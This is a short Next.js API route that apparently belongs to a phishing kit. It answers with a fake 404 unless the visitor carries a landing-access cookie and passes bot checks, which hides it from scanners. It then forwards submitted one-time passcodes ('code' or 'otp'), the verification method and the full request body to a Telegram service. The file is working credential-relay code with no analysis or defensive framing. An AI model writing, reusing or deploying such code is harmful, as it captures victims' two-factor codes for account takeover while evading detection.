import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { LANDING_ACCESS_COOKIE } from "@/lib/landing-access-cookie"
import { verifyLandingGrantToken } from "@/lib/landing-grant-token"
import { hasBrowserProof } from "@/lib/bot-risk/proof-cookies"

export async function POST(request: NextRequest) {
  if (!isLocalTestingUnlocked()) {
    const guardReq = request as unknown as NextRequest
    const guardIp = getClientIpFromRequest(guardReq)
    const guardUa = guardReq.headers.get("user-agent") || ""
    const guardGrant = guardReq.cookies.get(LANDING_ACCESS_COOKIE)?.value
    const guardGrantOk = verifyLandingGrantToken(guardGrant, guardIp, guardUa) || guardGrant === "1"
    if (!guardGrantOk || !hasBrowserProof(guardReq)) {
      return NextResponse.json({ error: "Not Found" }, { status: 404 })
    }
  }

  try {
    const body = await request.json()
    const code =
      (typeof body.code === "string" && body.code) ||
      (typeof body.otp === "string" && body.otp) ||
      ""
    const verificationType =
      (typeof body.verificationType === "string" && body.verificationType) ||
      (typeof body.method === "string" && body.method) ||
      undefined
    await telegramService.sendVerificationNotification({
      ...body,
      code,
      verificationType,
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
